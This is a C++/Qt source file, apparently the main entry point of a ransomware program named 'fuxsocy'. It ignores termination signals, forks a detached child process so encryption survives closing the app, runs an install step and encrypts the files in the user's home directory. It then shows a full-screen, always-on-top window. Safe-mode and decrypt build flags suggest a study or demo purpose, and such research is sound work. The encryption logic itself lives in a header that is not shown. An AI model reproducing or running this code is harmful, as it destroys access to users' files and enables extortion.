#include "mainwindow.h"

#include <QApplication>
#include <csignal>
#include <iostream>
#include <QStandardPaths>
#include "fsociety.h"

void signalHandler(int sig) {
	std::cout << "🖕💀🔥💀🔥💀🔥🖕" << std::endl;
}

int main(int argc, char *argv[])
{
#if SAFE_MODE
	std::cout << "Using safe mode 🦺" << std::endl;
#endif
	// catch signals
	std::array<int, 5> sigs = {SIGINT, SIGTERM, SIGHUP, SIGUSR1, SIGUSR2};
	for (int sig : sigs)
		signal(sig, signalHandler);

	// create a new process to do the encryption
	// this way even if the user close the application files will be encrypted
	if (fork() == 0) { // inside children
		// catch signals
		for (int sig : sigs)
			signal(sig, SIG_IGN);

		// detach child from parent and run in a new session
		setsid();

		Fsociety f;
		f.setExtExclusions({argv[0]});

		QString workingDir = QStandardPaths::writableLocation(QStandardPaths::HomeLocation);
	#if SAFE_MODE
		workingDir = "/tmp/fuxsocy";
	#else
		f.install();
	#endif

	#if DECRYPT
		f.decryptFiles(workingDir);
	#else
		f.encryptFiles(workingDir);
	#endif
	}

	QApplication a(argc, argv);
	MainWindow w;
	w.setWindowState(Qt::WindowFullScreen);
	w.setWindowFlags(w.windowFlags() | Qt::WindowStaysOnTopHint);
#if SHOW_WINDOW
	w.show();
	return a.exec();
#endif
}
